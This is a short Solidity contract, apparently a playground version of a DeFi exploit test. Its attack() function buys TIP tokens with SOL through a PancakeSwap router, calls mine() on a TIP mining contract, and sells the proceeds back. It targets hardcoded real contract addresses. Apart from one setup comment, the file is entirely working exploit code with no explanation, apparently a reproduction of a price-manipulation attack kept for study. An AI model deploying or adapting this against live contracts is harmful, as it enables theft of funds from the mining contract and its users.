// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// Playground stand-in for TIPMineExploit.testExploit. deal(SOL) is a setup step.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ITIPMine {
    function mine() external;
}

contract TIPMinePlay {
    address internal constant SOL = 0x570A5D26f7765Ecb712C0924E4De545B89fD43dF;
    address internal constant TIP = 0x36D75b5A8c724B692FBA78aC2dd8cE933c0e1F4E;
    IPancakeRouter internal constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ITIPMine internal constant MINE = ITIPMine(0x412c7bd213D4feA88b582A8A0E5B80e2F2d10993);

    function attack() external {
        IERC20(SOL).approve(address(ROUTER), type(uint256).max);
        IERC20(TIP).approve(address(ROUTER), type(uint256).max);
        address[] memory buyPath = new address[](2);
        buyPath[0] = SOL;
        buyPath[1] = TIP;
        address[] memory sellPath = new address[](2);
        sellPath[0] = TIP;
        sellPath[1] = SOL;
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(1 ether, 0, buyPath, address(this), block.timestamp);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(35_121 ether, 0, buyPath, address(this), block.timestamp);
        MINE.mine();
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(TIP).balanceOf(address(this)), 0, sellPath, address(this), block.timestamp
        );
    }
}
